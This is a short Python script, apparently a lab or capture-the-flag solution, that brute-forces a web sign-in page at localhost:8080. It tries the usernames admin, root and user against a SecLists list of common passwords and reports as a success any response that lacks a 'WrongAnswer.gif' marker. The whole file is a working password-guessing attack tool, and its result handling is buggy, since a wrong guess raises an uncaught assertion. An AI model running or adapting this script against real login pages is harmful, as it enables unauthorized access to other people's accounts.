from colorama import Fore, Style
import requests


def print_result(color, message, username, password):
    print(
        f"{color}[{message}] Username: {username} | Password: {password}{Style.RESET_ALL}"
    )


def attempt_login(username, password):
    params = {
        "page": "signin",
        "username": username,
        "password": password,
        "Login": "Login",
    }

    try:
        response = requests.get(
            "http://localhost:8080/index.php", params=params, timeout=0.5
        )
        assert "WrongAnswer.gif" not in response.text
        print_result(Fore.GREEN, "SUCCESS", username, password)
    except requests.Timeout:
        print_result(Fore.RED, "FAILURE", username, password)


def brute_force():
    usernames = ["admin", "root", "user"]
    passwords = sorted(
        line.strip()
        for line in open(
            "SecLists/Passwords/Common-Credentials/2020-200_most_used_passwords.txt"
        ).readlines()
    )

    for username in usernames:
        for password in passwords:
            attempt_login(username, password)


if __name__ == "__main__":
    brute_force()
